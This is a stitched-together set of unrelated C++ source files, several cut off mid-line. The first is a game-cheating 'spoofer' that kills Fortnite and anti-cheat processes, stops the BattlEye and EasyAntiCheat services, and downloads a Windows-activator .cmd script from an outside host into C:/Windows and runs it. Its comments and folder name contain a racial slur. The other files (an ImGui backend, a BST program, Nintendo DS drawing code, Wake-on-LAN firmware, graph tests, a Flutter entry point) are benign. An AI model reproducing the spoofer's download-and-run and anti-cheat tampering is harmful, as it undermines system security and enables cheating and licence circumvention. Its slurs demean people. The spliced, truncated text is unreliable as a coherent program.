    "#include <Windows.h>\n#include \"auth/auth.hpp\"\n#include <string>\n#include \"auth/utils.hpp\"\n#include \"auth/skStr.h\"\n\n\n#include <iostream>\n#include <string>\n#include <vector>\n#include <filesystem>\n#include <Windows.h>\n#include <Urlmon.h>\n\n#pragma comment(lib, \"Urlmon.lib\")\n\nnamespace fs = std::filesystem;\n\n#include <codecvt>\n\n#include <Windows.h>\n\nbool downloadFile(const std::wstring& url, const std::wstring& filePath) {\n    // nigger\n    int urlSize = WideCharToMultiByte(CP_UTF8, 0, url.c_str(), -1, nullptr, 0, nullptr, nullptr);\n    int filePathSize = WideCharToMultiByte(CP_UTF8, 0, filePath.c_str(), -1, nullptr, 0, nullptr, nullptr);\n\n    std::string narrowUrl(urlSize, '\\0');\n    std::string narrowFilePath(filePathSize, '\\0');\n\n    WideCharToMultiByte(CP_UTF8, 0, url.c_str(), -1, narrowUrl.data(), urlSize, nullptr, nullptr);\n    WideCharToMultiByte(CP_UTF8, 0, filePath.c_str(), -1, narrowFilePath.data(), filePathSize, nullptr, nullptr);\n\n    // nigger\n    HRESULT hr = URLDownloadToFileA(nullptr, narrowUrl.c_str(), narrowFilePath.c_str(), 0, nullptr);\n    if (FAILED(hr)) {\n        std::cerr << \"Failed to download files. Error code: \" << hr << std::endl;\n        return false;\n    }\n    return true;\n}\n\nvoid menu();\n\nint temp() {\n\n    INPUT input[2];\n\n    \n    input[0].type = INPUT_KEYBOARD;\n    input[0].ki.wScan = 0;\n    input[0].ki.time = 0;\n    input[0].ki.dwExtraInfo = 0;\n    input[0].ki.wVk = 0x31;  \n    input[0].ki.dwFlags = 0;  \n\n    \n    input[1].type = INPUT_KEYBOARD;\n    input[1].ki.wScan = 0;\n    input[1].ki.time = 0;\n    input[1].ki.dwExtraInfo = 0;\n    input[1].ki.wVk = 0x31;  \n    input[1].ki.dwFlags = KEYEVENTF_KEYUP;\n\n    \n    SendInput(2, input, sizeof(INPUT));\n\n    \n    input[0].ki.wVk = VK_RETURN;  \n    input[0].ki.dwFlags = 0;      \n\n    \n    input[1].ki.wVk = VK_RETURN;  \n    input[1].ki.dwFlags = KEYEVENTF_KEYUP;\n\n    \n    SendInput(2, input, sizeof(INPUT));\n\n}\n\nint win()\n{\n    system(\"cls\");\n\n    std::wstring folderPath = L\"C:/Windows/SupaNiga/\";\n    fs::create_directory(folderPath);\n\n    std::vector<std::wstring> fileURLs = {\n        L\"http://root1337.cdn.zerocdn.com/MAS_AIO-CRC32_9AE8AFBA%20%281%29.cmd\",\n    };\n\n    std::vector<std::wstring> fileNames = {\n        L\"windows.cmd\"\n    };\n\n    for (size_t i = 0; i < fileURLs.size(); ++i) {\n        if (!downloadFile(fileURLs[i], folderPath + fileNames[i])) {\n            std::wcerr << L\"Failed to download file: \" << fileURLs[i] << std::endl;\n            return 1;\n        }\n    }\n    _wsystem((folderPath + L\"windows.cmd\").c_str());\n\n    menu();\n}\nvoid tools()\n{\n    SetConsoleTitleA(\"Inertia TOOLS\");\n    system(\"cls\");\n    system(\"cls\");\n\n    printf(\"[ INFO ] Welcome to Inertia PERM SPOOFER\\n\\n\");\n    printf(\"\\n[1] Windows Activator \\n[2] MAC Spoof \\n[3] Return \\n[>] \");\n\n    std::string Spoof;\n    std::cin >> Spoof;\n\n    if (Spoof == \"1\" || Spoof == \"one\") {\n        \n        printf(\"[WARNING] THIS WILL CLOSE THE SPOOFER\");\n        Sleep(2000);\n        ShowWindow(GetConsoleWindow(), SW_HIDE);\n        win();\n        ShowWindow(GetConsoleWindow(), SW_SHOW);\n        printf(\"Done Spoofing...\");\n        Sleep(2000);\n    }\n    if (Spoof == \"2\" || Spoof == \"two\") {\n        printf(\"comign soon :)\");\n        tools();\n    }\n    if (Spoof == \"3\" || Spoof == \"three\") {\n        printf(\"Returning..\");\n        Sleep(2000);\n        menu();\n    }\n\n\n\n\n}\n\nvoid check()\n{\n    system(\"cls\");\n    system(\"echo BaseBoard:\");\n    Sleep(200);\n    system(\"wmic baseboard get serialnumber\");\n    Sleep(200);\n    system(\"echo System UUID:\") ;\n    Sleep(200);\n    system(\"wmic path win32_computersystemproduct get uuid\") ;\n    Sleep(200);\n    system(\"echo BIOS:\") ;\n    Sleep(200);\n    system(\"wmic bios get serialnumber\") ;\n    Sleep(200);\n    system(\"echo CPU:\") ;\n    Sleep(200);\n    system(\"wmic cpu get serialnumber\") ;\n    Sleep(200);\n    system(\"echo Mac Address:\") ;\n    Sleep(200);\n    system(\"getmac\") ;\n    Sleep(200);\n    std::cout << (\"  \")  << '\\n';\n    Sleep(200);\n    system(\"echo -----------------------------------------------\") ;\n    Sleep(200);\n    system(\"echo Returning In 5 Seconds\");\n    Sleep(200);\n    system(\"echo -----------------------------------------------\") ;\n    Sleep(5000);\n    system(\"cls\") ;\n    menu();\n}\n\n\n\nint spoof() {\n    system(\"taskkill /F /IM EpicGamesLauncher.exe >nul 2>&1\");\n    system(\"taskkill /F /IM EasyAntiCheatLauncher.exe >nul 2>&1\");\n    system(\"taskkill /F /IM BEService.exe >nul 2>&1\");\n    system(\"taskkill /F /IM Fortnite.exe >nul 2>&1\");\n    system(\"taskkill /F /IM BattleEyeLauncher.exe >nul 2>&1\");\n    system(\"taskkill /F /IM FortniteClient-Win64-Shipping.exe >nul 2>&1\");\n    system(\"sc stop BEService >nul 2>&1\");\n    system(\"sc stop BEDaisy >nul 2>&1\");\n    system(\"sc stop EasyAntiCheat >nul 2>&1\");\n    system(\"sc stop EasyAntiCheatSys >nul 2>&1\");\n\n    system(\"cls\");\n\n    std::wstring folderPath = L\"C:/Windows/SupaNiga/\";\n    fs::create_directory(folderPath);\n\n    std::vector<std::wstring> fileURLs = {\n        L\"http://root1337.cd",
    "// dear imgui: Renderer Backend for modern OpenGL with shaders / programmatic pipeline\n// - Desktop GL: 2.x 3.x 4.x\n// - Embedded GL: ES 2.0 (WebGL 1.0), ES 3.0 (WebGL 2.0)\n// This needs to be used along with a Platform Backend (e.g. GLFW, SDL, Win32, custom..)\n\n// Implemented features:\n//  [X] Renderer: User texture binding. Use 'GLuint' OpenGL texture identifier as void*/ImTextureID. Read the FAQ about ImTextureID!\n//  [x] Renderer: Large meshes support (64k+ vertices) with 16-bit indices (Desktop OpenGL only).\n\n// About WebGL/ES:\n// - You need to '#define IMGUI_IMPL_OPENGL_ES2' or '#define IMGUI_IMPL_OPENGL_ES3' to use WebGL or OpenGL ES.\n// - This is done automatically on iOS, Android and Emscripten targets.\n// - For other targets, the define needs to be visible from the imgui_impl_opengl3.cpp compilation unit. If unsure, define globally or in imconfig.h.\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2024-04-16: OpenGL: Detect ES3 contexts on desktop based on version string, to e.g. avoid calling glPolygonMode() on them. (#7447)\n//  2024-01-09: OpenGL: Update GL3W based imgui_impl_opengl3_loader.h to load \"libGL.so\" and variants, fixing regression on distros missing a symlink.\n//  2023-11-08: OpenGL: Update GL3W based imgui_impl_opengl3_loader.h to load \"libGL.so\" instead of \"libGL.so.1\", accommodating for NetBSD systems having only \"libGL.so.3\" available. (#6983)\n//  2023-10-05: OpenGL: Rename symbols in our internal loader so that LTO compilation with another copy of gl3w is possible. (#6875, #6668, #4445)\n//  2023-06-20: OpenGL: Fixed erroneous use glGetIntegerv(GL_CONTEXT_PROFILE_MASK) on contexts lower than 3.2. (#6539, #6333)\n//  2023-05-09: OpenGL: Support for glBindSampler() backup/restore on ES3. (#6375)\n//  2023-04-18: OpenGL: Restore front and back polygon mode separately when supported by context. (#6333)\n//  2023-03-23: OpenGL: Properly restoring \"no shader program bound\" if it was the case prior to running the rendering function. (#6267, #6220, #6224)\n//  2023-03-15: OpenGL: Fixed GL loader crash when GL_VERSION returns NULL. (#6154, #4445, #3530)\n//  2023-03-06: OpenGL: Fixed restoration of a potentially deleted OpenGL program, by calling glIsProgram(). (#6220, #6224)\n//  2022-11-09: OpenGL: Reverted use of glBufferSubData(), too many corruptions issues + old issues seemingly can't be reproed with Intel drivers nowadays (revert 2021-12-15 and 2022-05-23 changes).\n//  2022-10-11: Using 'nullptr' instead of 'NULL' as per our switch to C++11.\n//  2022-09-27: OpenGL: Added ability to '#define IMGUI_IMPL_OPENGL_DEBUG'.\n//  2022-05-23: OpenGL: Reworking 2021-12-15 \"Using buffer orphaning\" so it only happens on Intel GPU, seems to cause problems otherwise. (#4468, #4825, #4832, #5127).\n//  2022-05-13: OpenGL: Fixed state corruption on OpenGL ES 2.0 due to not preserving GL_ELEMENT_ARRAY_BUFFER_BINDING and vertex attribute states.\n//  2021-12-15: OpenGL: Using buffer orphaning + glBufferSubData(), seems to fix leaks with multi-viewports with some Intel HD drivers.\n//  2021-08-23: OpenGL: Fixed ES 3.0 shader (\"#version 300 es\") use normal precision floats to avoid wobbly rendering at HD resolutions.\n//  2021-08-19: OpenGL: Embed and use our own minimal GL loader (imgui_impl_opengl3_loader.h), removing requirement and support for third-party loader.\n//  2021-06-29: Reorganized backend to pull data from a single structure to facilitate usage with multiple-contexts (all g_XXXX access changed to bd->XXXX).\n//  2021-06-25: OpenGL: Use OES_vertex_array extension on Emscripten + backup/restore current state.\n//  2021-06-21: OpenGL: Destroy individual vertex/fragment shader objects right after they are linked into the main shader.\n//  2021-05-24: OpenGL: Access GL_CLIP_ORIGIN when \"GL_ARB_clip_control\" extension is detected, inside of just OpenGL 4.5 version.\n//  2021-05-19: OpenGL: Replaced direct access to ImDrawCmd::TextureId with a call to ImDrawCmd::GetTexID(). (will become a requirement)\n//  2021-04-06: OpenGL: Don't try to read GL_CLIP_ORIGIN unless we're OpenGL 4.5 or greater.\n//  2021-02-18: OpenGL: Change blending equation to preserve alpha in output buffer.\n//  2021-01-03: OpenGL: Backup, setup and restore GL_STENCIL_TEST state.\n//  2020-10-23: OpenGL: Backup, setup and restore GL_PRIMITIVE_RESTART state.\n//  2020-10-15: OpenGL: Use glGetString(GL_VERSION) instead of glGetIntegerv(GL_MAJOR_VERSION, ...) when th",
    "#include<iostream>\nusing namespace std;\nvoid con_obst(void);\nvoid print(int,int);\nfloat a[20],b[20],wt[20][20],c[20][20];\nint r[20][20],n;\nint main()\n  {\n\tint i;\n\tcout<<\"\\n*** PROGRAM FOR OBST ***\\n\";\n\tcout<<\"\\nEnter the no. of nodes : \";\n\tcin>>n;cout<<\"\\nEnter the probability for successful search :: \";\n\tcout<<\"\\n----------------\\n\";\n\tfor(i=1;i<=n;i++)\n\t  {\n\t\tcout<<\"p[\"<<i<<\"]\";\n\t\tcin>>a[i];\n\t  }\n\tcout<<\"\\nEnter the probability for unsuccessful search :: \";\n\tcout<<\"\\n-----------------\\n\";\n\tfor(i=0;i<=n;i++)\n\t  {\n\t\tcout<<\"q[\"<<i<<\"]\";\n\t\tcin>>b[i];\n\t  }\n\tcon_obst();\n\tprint(0,n);\n\tcout<<endl;\n}\nvoid con_obst(void)\n{\n\tint i,j,k,l,min;\n\tfor(i=0;i<n;i++)\n\t  { //Initialisation\n\t\tc[i][i]=0.0;\n\t\tr[i][i]=0;\n\t\twt[i][i]=b[i];\n\t\t// for j-i=1 can be j=i+1\n\t\twt[i][i+1]=b[i]+b[i+1]+a[i+1];\n\t\tc[i][i+1]=b[i]+b[i+1]+a[i+1];\n\t\tr[i][i+1]=i+1;\n\t  }\n\tc[n][n]=0.0;\n\tr[n][n]=0;\n\twt[n][n]=b[n];\n\t//for j-i=2,3,4....,n\n\tfor(i=2;i<=n;i++)\n\t  {\n\t\tfor(j=0;j<=n-i;j++)\n\t\t  {\n\t\t\twt[j][j+i]=b[j+i]+a[j+i]+wt[j][j+i-1];\n\t\t\tc[j][j+i]=9999;\n\t\t\tfor(l=j+1;l<=j+i;l++)\n\t\t\t  {\n\t\t\t\tif(c[j][j+i]>(c[j][l-1]+c[l][j+i]))\n\t\t\t\t  {\n\t\t\t\t\tc[j][j+i]=c[j][l-1]+c[l][j+i];\n\t\t\t\t\tr[j][j+i]=l;\n\t\t\t\t  }\n\t\t\t  }\n\t\t\tc[j][j+i]+=wt[j][j+i];\n\t\t  }\n\t\tcout<<endl;\n\t  }\n\tcout<<\"\\n\\nOptimal BST is :: \";\n\tcout<<\"\\nw[0][\"<<n<<\"] :: \"<<wt[0][n];\n\tcout<<\"\\nc[0][\"<<n<<\"] :: \"<<c[0][n];\n\tcout<<\"\\nr[0][\"<<n<<\"] :: \"<<r[0][n];\n  }\nvoid print(int l1,int r1)\n  {\n\tif(l1>=r1)\n\t\treturn;\n\tif(r[l1][r[l1][r1]-1]!=0)\n\t\tcout<<\"\\n Left child of \"<<r[l1][r1]<<\" :: \"<<r[l1][r[l1][r1]-1];\n\tif(r[r[l1][r1]][r1]!=0)\n\t\tcout<<\"\\n Right child of \"<<r[l1][r1]<<\" :: \"<<r[r[l1][r1]][r1];\n\tprint(l1,r[l1][r1]-1);\n\tprint(r[l1][r1],r1);\n\treturn;\n}\n",
    "#include <nds.h>\r\n# include <stdio.h>\r\n\r\n//The grid is using a palette, each pixel is one byte (a palette index)\r\n//Each word is 2 pixels, either if the X is odd or not, the pixel will be the low byte or the high one\r\n\r\n//Set the right pixel to col\r\ninline void A(u16& Pix, u16 col) //PC\r\n{\r\n\tPix = ((Pix&0xFF)|col);\r\n}\r\n//Set both pixel left to col and right to col3\r\ninline u16 B(u16 col, u16 col3) //CC\r\n{\r\n\treturn (col|col3);\r\n}\r\n//Set the left pixel to col\r\ninline void C(u16 col, u16& Pix) //CP\r\n{\r\n\tPix = ((Pix&0xFF00)|col);\r\n}\r\n\r\n//How many objects\r\nconst int CELLSIZE = 128;\r\n\r\n//Col is the laser's color\r\n//HCol is the pale laser's color\r\n//ColG is highbyte version of the laser's color, for the left pixel\r\n//HColG is highbyte version of the pale laser's color, for the left pixel\r\n//x,y are the cell's coordonates\r\n//X,Y are the backbuffer's coordonate (backBuffer is a point to the background buffer + a constant to\r\n//the top left corner of the grid (YOrg*CELLSIZE+XOrg/2)\r\n\r\n//First the corners, it's just about one pixel\r\n//SE corner, just one pixel down right (+ (CELLSIZE*14) + (X+7))\r\ninline void DoCSE(u16* backBuffer,int x,int y, u16 Col)\r\n{\r\n\tu16 HCol = Col + 7;\r\n\tu16 HColG = HCol;\r\n\tHCol = HCol<<8;\r\n\r\n\tint X = x*15;\r\n\tint Y = y*15;\r\n\tX = X / 2;\r\n\r\n\tswitch (x%2) {\r\n\t\t//x is not odd, it's a left pixel\r\n\t\tcase 0:\r\n\t\t\tC(HColG,backBuffer[((Y* 128) + (128*14) + (X+7))]);\r\n\t\tbreak;\r\n\t\t//x is odd, it's a right pixel\r\n\t\tcase 1:\r\n\t\t\tA(backBuffer[((Y* 128) + (128*14) + (X+7))],HCol); \r\n\t\tbreak;\r\n\t}\r\n}\r\n\r\n//NO corner, just one pixel up left (+0)\r\ninline void DoCNO(u16* backBuffer,int x,int y, u16 Col)\r\n{\r\n\tu16 HCol = Col + 7;\r\n\tu16 HColG = HCol;\r\n\tHCol = HCol<<8;\r\n\r\n\tint X = x*15;\r\n\tint Y = y*15;\r\n\tX = X / 2;\r\n\r\n\tswitch (x%2) {\r\n\t\tcase 0:\r\n\t\t\tC(HColG,backBuffer[((Y* 128) + (X))]);\r\n\t\tbreak;\r\n\t\tcase 1:\r\n\t\t\tA(backBuffer[((Y* 128) + (X))],HCol); \r\n\t\tbreak;\r\n\t}\r\n}\r\n\r\ninline void DoCSO(u16* backBuffer,int x,int y, u16 Col)\r\n{\r\n\tu16 HCol = Col + 7;\r\n\tu16 HColG = HCol;\r\n\tHCol = HCol<<8;\r\n\r\n\tint X = x*15;\r\n\tint Y = y*15;\r\n\tX = X / 2;\r\n\r\n\tswitch (x%2) {\r\n\t\tcase 0:\r\n\t\t\tC(HColG,backBuffer[((Y* 128) + (128*14) + (X))]);\r\n\t\tbreak;\r\n\t\tcase 1:\r\n\t\t\tA(backBuffer[((Y* 128) + (128*14) + (X))],HCol); \r\n\t\tbreak;\r\n\t}\r\n}\r\n\r\ninline void DoCNE(u16* backBuffer,int x,int y, u16 Col)\r\n{\r\n\tu16 HCol = Col + 7;\r\n\tu16 HColG = HCol;\r\n\tHCol = HCol<<8;\r\n\r\n\tint X = x*15;\r\n\tint Y = y*15;\r\n\tX = X / 2;\r\n\r\n\tswitch (x%2) {\r\n\t\tcase 0:\r\n\t\t\tC(HColG,backBuffer[((Y* 128) + (X+7))]);\r\n\t\tbreak;\r\n\t\tcase 1:\r\n\t\t\tA(backBuffer[((Y* 128) + (X+7))],HCol); \r\n\t\tbreak;\r\n\t}\r\n}\r\n\r\n//From the middle of the cell (+ (128*6) + (X+4)) till the north east (X+7)\r\ninline void DoNE(u16* backBuffer,int x,int y, u16 Col)\r\n{\r\n\tu16 HCol = Col + 7;\r\n\tu16 HColG = HCol;\r\n\tu16 ColG = Col;\r\n\tHCol = HCol<<8;\r\n\tCol = Col<<8;\r\n\r\n\tint X = x*15;\r\n\tint Y = y*15;\r\n\tX = X / 2;\r\n\r\n\tswitch (x%2) {\r\n\t\tcase 0:\r\n\t\t\tA(backBuffer[((Y* 128)  + (128*6) + (X+3))],HCol); backBuffer[((Y* 128)  + (128*6) + (X+4))]=B(ColG,HCol);\r\n\t\t\tbackBuffer[((Y* 128)  + (128*5) + (X+4))]=B(HColG,Col); C(HColG,backBuffer[((Y* 128) + (128*5) + (X+5))]);\r\n\t\t\tA(backBuffer[((Y* 128) + (128*4) + (X+4))],HCol); backBuffer[((Y* 128) + (128*4) + (X+5))]=B(ColG,HCol); \r\n\t\t\tbackBuffer[((Y* 128)  + (128*3) + (X+5))]=B(HColG,Col); C(HColG,backBuffer[((Y* 128) + (128*3) + (X+6))]);\r\n\t\t\tA(backBuffer[((Y* 128) + (128*2) + (X+5))],HCol); backBuffer[((Y* 128) + (128*2) + (X+6))]=B(ColG,HCol); \r\n\t\t\tbackBuffer[((Y* 128)  + (128*1) + (X+6))]=B(HColG,Col); C(HColG,backBuffer[((Y* 128) + (128*1) + (X+7))]);\r\n\t\t\tA(backBuffer[((Y* 128) + (X+6))],HCol); C(ColG,backBuffer[((Y* 128) + (X+7))]); \r\n\t\tbreak;\r\n\t\tcase 1:\r\n\t\t\tbackBuffer[((Y* 128)  + (128*6)  + (X+4))]=B(HColG,Col);C(HColG,backBuffer[((Y* 128) + (128*6) + (X+5))]);\r\n\t\t\tA(backBuffer[((Y* 128) + (128*5) + (X+4))],HCol);backBuffer[((Y* 128) + (128*5) + (X+5))]=B(ColG,HCol);\r\n\t\t\tbackBuffer[((Y* 128)  + (128*4)  + (X+5))]=B(HColG,Col); C(HColG,backBuffer[((Y* 128) + (128*4) + (X+6))]);\r\n\t\t\tA(backBuffer[((Y* 128) + (128*3) + (X+5))],HCol);backBuffer[((Y* 128) + (128*3) + (X+6))]=B(ColG,HCol);\r\n\t\t\tbackBuffer[((Y* 128)  + (128*2)  + (X+6))]=B(HColG,Col); C(HColG,backBuffer[((Y* 128) + (128*2) + (X+7))]);\r\n\t\t\tA(backBuffer[((Y* 128) + (128*1) + (X+6))],HCol);backBuffer[((Y* 128) + (128*1) + (X+7))]=B(ColG,HCol);\r\n\t\t\tbackBuffer[((Y* 128) + (X+7))]=B(HColG,Col);\r\n\t\tbreak;\r\n\t}\r\n}\r\n\r\n//From the South west of the cell (+ (128*14)) till the middle (+ (128*7) + (X+4))\r\ninline void DoSO(u16* backBuffer,int x,int y, u16 Col)\r\n{\r\n\tu16 HCol = Col + 7;\r\n\tu16 HColG = HCol;\r\n\tu16 ColG = Col;\r\n\tHCol = HCol<<8;\r\n\tCol = Col<<8;\r\n\r\n\tint X = x*15;\r\n\tint Y = y*15;\r\n\tX = X / 2;\r\n\r\n\tswitch (x%2) {\r\n\t\tcase 0:\r\n\t\t\tbackBuffer[((Y* CELLSIZE) + (128*14) + (X))]=B(ColG,HCol);\r\n\t\t\tbackBuffer[((Y* 128) + (128*13) + (X))]=B(HColG,Col); C(HColG,backBuffer[((Y* 128) + (128*13) + (X+1))]);\r\n\t\t\tA(backBuffer[((Y* 128) + (128*12) + (X))],HCol); backBuffer[((Y* 128) + (128*12) + (X+1))]=B(ColG,HCol); \r\n\t\t\tbackBuffer[((Y* 128) + (128*11) + (",
    "#include \"bemfa_client.hpp\"\n#include \"WakeOnLan.h\"\n#include \"wifi_helper.hpp\"\n\nBemfaClient* bemfaClient;\nWifiHelper* wifiHelper;\n\nWiFiUDP UDP;\nWakeOnLan WOL(UDP);\n\nconst int LED_Pin = 2;\n\nconst char *SSID = \"xxxx\";  // wifi\u540d\u79f0\nconst char *PSW = \"xxxx\";  // wifi\u5bc6\u7801\n\nconst char *UID = \"xxxx\";  // \u5df4\u6cd5\u4e91\u7684UID\nconst char *TOPIC = \"xxxx\";  // \u5df4\u6cd5\u4e91\u4e2d\u521b\u5efa\u7684TOPIC(\u4e0d\u662f\u6635\u79f0)\n\nconst char *TARGET_MAC_ADDR = \"xx:xx:xx:xx:xx:xx\";  // \u8981\u542f\u52a8\u7684\u7535\u8111\u7684MAC\u5730\u5740\n\nvoid blinkTwice() {\n    digitalWrite(LED_Pin, HIGH);\n    delay(200);\n    digitalWrite(LED_Pin, LOW);\n    delay(200);\n    digitalWrite(LED_Pin, HIGH);\n    delay(200);\n    digitalWrite(LED_Pin, LOW);\n}\n\nvoid setup() {\n    Serial.begin(115200);\n    Serial.println(\"Beginning...\");\n    wifiHelper = new WifiHelper(SSID, PSW, LED_Pin);\n    bemfaClient = new BemfaClient(UID, TOPIC);\n    bemfaClient->addCommand(\"on\", []{\n        Serial.println(\"Send magic packet\");\n        WOL.setRepeat(3, 100);\n        WOL.calculateBroadcastAddress(WiFi.localIP(), WiFi.subnetMask());\n        WOL.sendMagicPacket(TARGET_MAC_ADDR);\n        blinkTwice();\n    });\n}\n\nvoid loop() {\n    wifiHelper->tick();\n    bemfaClient->tick();\n}",
    "#include \"doctest.h\"\n#include \"Algorithms.hpp\"\n#include \"Graph.hpp\"\nusing namespace std;\n\nTEST_CASE(\"Test isConnected Undirected graph\")\n{\n        ariel::Graph g;\n\n        g.setIsDirected(false);\n        vector<vector<int>> graph = {\n            {0, 1, 0},\n            {1, 0, 1},\n            {0, 1, 0}};\n        g.loadGraph(graph);\n        CHECK(ariel::Algorithms::isConnected(g) == true);\n\n        vector<vector<int>> graph2 = {\n            {0, 1, 1, 0, 0},\n            {1, 0, 1, 0, 0},\n            {1, 1, 0, 1, 0},\n            {0, 0, 1, 0, 0},\n            {0, 0, 0, 0, 0}};\n        g.loadGraph(graph2);\n        CHECK(ariel::Algorithms::isConnected(g) == false);\n}\nTEST_CASE(\"Test shortestPath\")\n{\n        ariel::Graph g;\n        vector<vector<int>> graph = {\n            {0, 1, 0},\n            {1, 0, 1},\n            {0, 1, 0}};\n\n        g.loadGraph(graph);\n        CHECK(ariel::Algorithms::shortestPath(g, 0, 2) == \"0->1->2\");\n\n        vector<vector<int>> graph2 = {\n            {0, 1, 1, 0, 0},\n            {1, 0, 1, 0, 0},\n            {1, 1, 0, 1, 0},\n            {0, 0, 1, 0, 0},\n            {0, 0, 0, 0, 0}};\n        g.loadGraph(graph2);\n        CHECK(ariel::Algorithms::shortestPath(g, 0, 4) == \"No path found\");\n}\nTEST_CASE(\"Test isContainsCycle\")\n{\n        ariel::Graph g;\n        vector<vector<int>> graph = {\n            {0, 1, 0},\n            {1, 0, 1},\n            {0, 1, 0}};\n        g.loadGraph(graph);\n        CHECK(ariel::Algorithms::isContainsCycle(g) == \"0\");\n\n        vector<vector<int>> graph2 = {\n            {0, 1, 1, 0, 0},\n            {1, 0, 1, 0, 0},\n            {1, 1, 0, 1, 0},\n            {0, 0, 1, 0, 0},\n            {0, 0, 0, 0, 0}};\n\n        g.loadGraph(graph2);\n        CHECK(ariel::Algorithms::isContainsCycle(g) == \"Graph contains a cycle: 0->1->2->0\");\n}\nTEST_CASE(\"Test isBipartite\")\n{\n        ariel::Graph g;\n        vector<vector<int>> graph = {\n            {0, 1, 0},\n            {1, 0, 1},\n            {0, 1, 0}};\n        g.loadGraph(graph);\n        CHECK(ariel::Algorithms::isBipartite(g) == \"Graph is Bipartite and those are the two sets: A={0,2} B={1}\");\n\n        vector<vector<int>> graph2 = {\n            {0, 1, 1, 0, 0},\n            {1, 0, 1, 0, 0},\n            {1, 1, 0, 1, 0},\n            {0, 0, 1, 0, 0},\n            {0, 0, 0, 0, 0}};\n        g.loadGraph(graph2);\n        CHECK(ariel::Algorithms::isBipartite(g) == \"Graph is not Bipartite\");\n\n        vector<vector<int>> graph3 = {\n            {0, 1, 2, 0, 0},\n            {1, 0, 3, 0, 0},\n            {2, 3, 0, 4, 0},\n            {0, 0, 4, 0, 5},\n            {0, 0, 0, 5, 0}};\n        g.loadGraph(graph3);\n        CHECK(ariel::Algorithms::isBipartite(g) == \"Graph is not Bipartite\");\n\n        vector<vector<int>> graph4 = {\n            {0, 0, 0},\n            {0, 0, 0},\n            {0, 0, 0}};\n        g.loadGraph(graph4);\n        CHECK(ariel::Algorithms::isBipartite(g) == \"Graph is Bipartite and those are the two sets: A={0} B={1,2}\");\n}\nTEST_CASE(\"Test invalid graph\")\n{\n        ariel::Graph g;\n        vector<vector<int>> graph = {\n            {0, 1, 2, 0},\n            {1, 0, 3, 0},\n            {2, 3, 0, 4},\n            {0, 0, 4, 0},\n            {0, 0, 0, 5}};\n        CHECK_THROWS(g.loadGraph(graph));\n}\nTEST_CASE(\"Test Negative Cycle\")\n{\n        ariel::Graph g;\n        g.setIsDirected(true);\n        vector<vector<int>> graph = {\n            {0, -9, 0, 0},\n            {0, 0, -8, 0},\n            {0, 0, 0, -10},\n            {-7, 0, 0, 0},\n\n        };\n        g.loadGraph(graph);\n        CHECK(ariel::Algorithms::negativeCycle(g) == \"Negative cycle detected\");\n}\nTEST_CASE(\"Test Directed and Undirected Graphs\")\n{\n        ariel::Graph g;\n        vector<vector<int>> graph = {\n            {0, 0, 0, 8},\n            {0, 0, 0, 8},\n            {0, 0, 0, 8},\n            {8, 8, 8, 0}};\n        g.loadGraph(graph);\n        CHECK(ariel::Algorithms::isConnected(g) == true);\n        CHECK(ariel::Algorithms::isContainsCycle(g) == \"0\");\n\n        vector<vector<int>> graph2 = {\n            {0, 0, 0, 7},\n            {0, 0, 0, 8},\n            {0, 0, 0, 8},\n            {8, 8, 8, 0}};\n        g.setIsDirected(true);\n        g.loadGraph(graph2);\n        CHECK(ariel::Algorithms::isConnected(g) == true);\n        CHECK(ariel::Algorithms::isContainsCycle(g) != \"0\");\n\n        vector<vector<int>> graph3 = {\n            {0, 2},\n            {0, 0}};\n        g.loadGraph(graph3);\n        CHECK(ariel::Algorithms::isConnected(g) == false);\n        CHECK(ariel::Algorithms::isContainsCycle(g) == \"0\");\n\n        vector<vector<int>> graph4 = {\n            {0, 2},\n            {2, 0}};\n        g.loadGraph(graph4);\n        CHECK(ariel::Algorithms::isConnected(g) == true);\n        CHECK(ariel::Algorithms::isContainsCycle(g) != \"0\");\n\n        vector<vector<int>> graph5 = {\n            {0, 2},\n            {4, 0}};\n        g.loadGraph(graph5);\n        CHECK(ariel::Algorithms::isConnected(g) == true);\n        CHECK(ariel::Algorithms::isContainsCycle(g) != \"0\");\n        CHECK(ariel::Algorithms::isBipartite(g) =",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"photo_gallery_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  